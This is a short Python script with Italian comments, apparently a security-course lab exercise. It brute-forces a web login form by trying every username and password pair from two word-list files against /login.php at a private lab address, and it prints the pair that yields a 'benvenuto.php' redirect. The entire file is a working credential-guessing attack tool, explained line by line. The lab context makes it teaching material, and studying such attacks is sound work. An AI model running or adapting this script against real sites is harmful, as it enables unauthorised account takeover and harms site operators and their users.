import http.client, urllib.parse
#con http.client recuperiamo i metodi abilitati sul server chiamato.Il modulo urlib.parse ci fornisce le funzioni  per analizzare un url

username_file = open ('nomi_utenti.txt'  )  #si accetta un file input che viene letto / in questo casodi username password
password_file = open ('password.txt' )

user_list = username_file.readlines() #in questo caso il file verrà copiato
pwd_list = password_file.readlines()

#con il for/in richiediamo ai file copiati (user_list e pwd_list) di ciclare tutte le username e pass.

for user in user_list:
	user = user.rstrip()
	for pwd in pwd_list:
		pwd = pwd.rstrip()

		print (user, " - ", pwd)
		#con print vengono stampati a schermo le username e password richieste con il ciclo for.

		post_parameters = urllib.parse.urlencode ({ 'username' : user,  'password':  pwd, 'Submit'  : "Submit"  }) 
		#con post_parameters effettuiamo
	        #tutti i tentativi di inserimento delle username e password estratte precedentemente; cosi come segue:

		headers = {"Content-type"   : "application/x-www-form-urlencoded" , "Accept" :  "text/html, application/xhtnl+xml"    }

		conn = http.client.HTTPConnection ( "192.168.56.102"   , 80) 
		#richiediamo la connessione all'ip 192.168.56.102
		#La porta 80 identifica una connessione http

		conn.request ( "POST"  , "/login.php"  , post_parameters, headers)  
		#qui vengono inviati effettivamente
		# i dati sensibili (in quanto chiamata POST), alla route di login.

		response = conn.getresponse () 
		#con questa funzione otteniamo la risposta

		if(response.getheader ('location') == "benvenuto.php"   ): 
	        #se la risposta ottenuta è positiva (cioè le credenziali matchate sono giuste)
		#siamo dentro al sito.(abbiamo qui una risposta di benvenuto).
			print ("Logged with: " , user, " - " ,pwd )
